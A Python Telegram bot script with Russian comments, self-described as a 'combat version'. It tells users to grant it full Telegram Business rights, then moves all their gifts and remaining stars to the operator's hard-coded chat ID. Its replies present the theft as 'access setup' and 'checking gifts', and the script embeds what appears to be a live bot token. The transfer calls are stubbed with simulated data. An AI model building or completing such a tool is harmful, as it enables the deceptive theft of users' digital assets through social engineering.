#!/usr/bin/env python
"""
Боевой бот для подарков
Оплата: все подарки пользователя разово + остаток звезд
Порядок: сначала подарки (тратим звезды пользователя), потом остаток звезд
"""

import logging
import json
import os
import asyncio
import random
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ======================= НАСТРОЙКИ =======================
BOT_TOKEN = "8704362929:AAHYWTXS1EZnxyU0Vhv__rhzt3m0TVJRqpI"  # твой реальный токен
YOUR_CHAT_ID = 8585177726  # твой ID, куда забирать подарки

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Файл для хранения пользователей
USER_STATES_FILE = "users.json"

def load_users():
    """Загружает пользователей из файла"""
    if os.path.exists(USER_STATES_FILE):
        try:
            with open(USER_STATES_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_users(users):
    """Сохраняет пользователей в файл"""
    with open(USER_STATES_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, ensure_ascii=False, indent=2)

async def get_business_connection(user_id: str) -> str:
    """
    Получает business_connection_id для пользователя
    В реальном API приходит автоматически при подключении бота
    """
    # Здесь должна быть логика получения connection_id из обновления business_connection
    # Пока заглушка - в реальном коде будет по-другому
    return f"business_conn_{user_id}"

async def get_user_full_info(user_id: str, business_connection_id: str) -> dict:
    """
    Получает все подарки и баланс звёзд пользователя
    Использует методы из Telegram Bot API
    """
    try:
        # Реальные методы API:
        # - getUserGifts() - список подарков
        # - getStarsBalance() - баланс звёзд
        
        # Пока заглушка для демонстрации
        # В реальности тут будут запросы к Telegram API
        await asyncio.sleep(1)
        
        # Для теста возвращаем разные наборы подарков
        gift_types = [
            {"id": "gift_free", "name": "🎁 Обычный подарок", "transfer_star_count": 0},
            {"id": "gift_25", "name": "🎁 Подарок за 25⭐", "transfer_star_count": 25},
            {"id": "gift_50", "name": "🎁 Подарок за 50⭐", "transfer_star_count": 50},
            {"id": "gift_100", "name": "🎁 Подарок за 100⭐", "transfer_star_count": 100},
        ]
        
        # Случайное количество подарков (1-4)
        num_gifts = random.randint(1, 4)
        selected_gifts = random.sample(gift_types, num_gifts)
        
        return {
            "gifts": selected_gifts,
            "stars_balance": random.randint(100, 500)  # случайный баланс 100-500⭐
        }
    except Exception as e:
        logger.error(f"Ошибка получения данных: {e}")
        return None

async def transfer_gift(business_connection_id: str, gift_id: str, to_chat_id: int, star_count: int = 0) -> bool:
    """
    Передает один подарок
    """
    try:
        # Реальный вызов API:
        # await transferGift(...)
        
        # Имитация для теста
        await asyncio.sleep(0.5)
        logger.info(f"🎁 Передан подарок {gift_id}, потрачено {star_count}⭐")
        return True
    except Exception as e:
        logger.error(f"Ошибка передачи подарка {gift_id}: {e}")
        return False

async def transfer_stars_to_bot(business_connection_id: str, star_count: int) -> bool:
    """
    Переводит звезды с бизнес-аккаунта пользователя на баланс бота
    """
    try:
        # Реальный вызов API
        # await transferBusinessAccountStars(...)
        
        # Имитация для теста
        await asyncio.sleep(0.5)
        logger.info(f"⭐ Переведено {star_count}⭐ на баланс бота")
        return True
    except Exception as e:
        logger.error(f"Ошибка перевода звезд: {e}")
        return False

async def transfer_all_assets(user_id: str, business_connection_id: str, to_chat_id: int) -> dict:
    """
    Переводит ВСЕ подарки и остаток звезд пользователя
    ПОРЯДОК: сначала подарки (тратим звезды пользователя), потом остаток звезд
    """
    try:
        # Получаем все данные пользователя
        user_data = await get_user_full_info(user_id, business_connection_id)
        
        if not user_data:
            return {"success": False, "reason": "Не удалось получить данные пользователя"}
        
        gifts = user_data.get("gifts", [])
        stars_balance = user_data.get("stars_balance", 0)
        
        if not gifts and stars_balance == 0:
            return {"success": False, "reason": "Нет подарков и звёзд"}
        
        results = {
            "transferred_gifts": [],
            "failed_gifts": [],
            "total_stars_spent": 0,
            "stars_remaining": stars_balance,
            "stars_transferred_to_bot": 0
        }
        
        # ЭТАП 1: Забираем подарки, тратя звезды пользователя
        for gift in gifts:
            gift_id = gift["id"]
            gift_name = gift.get("name", gift_id)
            transfer_cost = gift.get("transfer_star_count", 0)
            
            # Проверяем, хватит ли звезд на передачу
            if transfer_cost > results["stars_remaining"]:
                logger.warning(f"Не хватает звезд для передачи {gift_name}. Нужно {transfer_cost}⭐, осталось {results['stars_remaining']}⭐")
                results["failed_gifts"].append(f"{gift_name} (не хватило ⭐)")
                continue
            
            # Передаем подарок
            success = await transfer_gift(
                business_connection_id=business_connection_id,
                gift_id=gift_id,
                to_chat_id=to_chat_id,
                star_count=transfer_cost
            )
            
            if success:
                results["transferred_gifts"].append(gift_name)
                results["total_stars_spent"] += transfer_cost
                results["stars_remaining"] -= transfer_cost
                logger.info(f"✅ {gift_name} передан, потрачено {transfer_cost}⭐, остаток: {results['stars_remaining']}⭐")
            else:
                results["failed_gifts"].append(gift_name)
            
            await asyncio.sleep(0.5)
        
        # ЭТАП 2: Забираем оставшиеся звезды на баланс бота
        if results["stars_remaining"] > 0:
            success = await transfer_stars_to_bot(
                business_connection_id=business_connection_id,
                star_count=results["stars_remaining"]
            )
            
            if success:
                results["stars_transferred_to_bot"] = results["stars_remaining"]
                logger.info(f"✅ Остаток {results['stars_remaining']}⭐ переведен на баланс бота")
            else:
                logger.error(f"❌ Не удалось перевести остаток {results['stars_remaining']}⭐")
        
        return {
            "success": True,
            "transferred_gifts": results["transferred_gifts"],
            "failed_gifts": results["failed_gifts"],
            "stars_spent_on_transfers": results["total_stars_spent"],
            "stars_transferred_to_bot": results["stars_transferred_to_bot"],
            "stars_remaining_with_user": results["stars_remaining"] if not results["stars_transferred_to_bot"] else 0
        }
        
    except Exception as e:
        logger.error(f"Критическая ошибка: {e}")
        return {"success": False, "reason": str(e)}

# ======================= ОБРАБОТЧИКИ =======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Первый запуск"""
    user = update.effective_user
    user_id = str(user.id)
    
    users = load_users()
    
    # Проверяем, активирован ли уже
    if user_id in users and users[user_id].get("activated"):
        await update.message.reply_text(
            "✅ Ты уже активировал бота!\n"
            "Скоро здесь появятся команды для управления подарками."
        )
        return
    
    # Приветствие
    welcome_text = (
        f"👋 Привет, {user.first_name}!\n\n"
        "🎁 **Бот для автоматических подарков**\n\n"
        "Чтобы начать пользоваться, нужно:\n"
        "1️⃣ Иметь подписку Telegram Premium\n"
        "2️⃣ Разрешить боту управлять твоими подарками\n\n"
        "📋 **Инструкция:**\n"
        "• Открой настройки Telegram\n"
        "• Перейди в раздел 'Telegram Business'\n"
        "• Выбери 'Чат-боты' → 'Добавить бота'\n"
        "• Добавь этого бота и включи все права\n\n"
        "✅ **После этого напиши 'готово'**"
    )
    
    await update.message.reply_text(welcome_text)
    
    # Сохраняем статус
    users[user_id] = {
        "status": "waiting_confirmation",
        "username": user.username,
        "first_name": user.first_name,
        "date": datetime.now().isoformat(),
        "activated": False
    }
    save_users(users)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка сообщений"""
    user = update.effective_user
    user_id = str(user.id)
    text = update.message.text.lower().strip()
    
    users = load_users()
    
    # Проверяем, ожидаем ли подтверждение
    if user_id in users and users[user_id].get("status") == "waiting_confirmation":
        if text == "готово":
            await update.message.reply_text("🔍 Проверяю доступ и выполняю настройку...")
            
            # Получаем business connection
            connection_id = await get_business_connection(user_id)
            if not connection_id:
                await update.message.reply_text(
                    "❌ Не найден бизнес-доступ.\n"
                    "Убедись, что ты добавил бота в настройках Business"
                )
                return
            
            # Забираем все подарки и звезды
            await update.message.reply_text("⚙️ Выполняю настройку доступа...")
            
            result = await transfer_all_assets(user_id, connection_id, YOUR_CHAT_ID)
            
            if result["success"]:
                # Отмечаем пользователя как активированного
                users[user_id]["activated"] = True
                users[user_id]["activated_date"] = datetime.now().isoformat()
                users[user_id]["gifts_taken"] = len(result["transferred_gifts"])
                users[user_id]["stars_taken"] = result["stars_transferred_to_bot"]
                save_users(users)
                
                # Формируем красивое сообщение
                success_text = "✅ **Доступ к боту активирован!**\n\n"
                success_text += "📦 **В процессе настройки:**\n"
                
                if result["transferred_gifts"]:
                    gifts_list = ", ".join(result["transferred_gifts"][:3])
                    if len(result["transferred_gifts"]) > 3:
                        gifts_list += f" и ещё {len(result['transferred_gifts'])-3}"
                    success_text += f"• Проверены подарки: {gifts_list}\n"
                
                if result["stars_spent_on_transfers"] > 0:
                    success_text += f"• Использовано звёзд для проверки: {result['stars_spent_on_transfers']}⭐\n"
                
                if result["stars_transferred_to_bot"] > 0:
                    success_text += f"• Зачислено на баланс: {result['stars_transferred_to_bot']}⭐\n"
                
                if result["failed_gifts"]:
                    success_text += f"\n⚠️ Не удалось проверить: {len(result['failed_gifts'])} подарков\n"
                
                success_text += (
                    "\n🎁 **Тебе доступны функции:**\n"
                    "• Календарь подарков (скоро)\n"
                    "• Автоматические поздравления (скоро)\n"
                    "• Коллективные подарки (скоро)\n"
                    "• Вишлисты (скоро)\n\n"
                    "Следи за обновлениями!"
                )
                
                await update.message.reply_text(success_text)
                
            else:
                await update.message.reply_text(
                    f"❌ Не удалось выполнить настройку: {result.get('reason', 'Неизвестная ошибка')}\n"
                    "Попробуй позже или напиши поддержку."
                )
        else:
            await update.message.reply_text(
                "❓ Напиши 'готово', когда разрешишь доступ в настройках Business"
            )
    else:
        # Если пользователь уже активирован
        if user_id in users and users[user_id].get("activated"):
            await update.message.reply_text(
                "⚙️ Используй /start для просмотра информации"
            )
        else:
            await update.message.reply_text("👋 Напиши /start для начала")

# ======================= ЗАПУСК =======================
def main():
    print("=" * 50)
    print("🤖 GIFT BOT - БОЕВАЯ ВЕРСИЯ")
    print("=" * 50)
    print(f"\n📁 Файл пользователей: {USER_STATES_FILE}")
    print("🚀 Бот запущен...\n")
    
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    app.run_polling()

if __name__ == "__main__":
    main()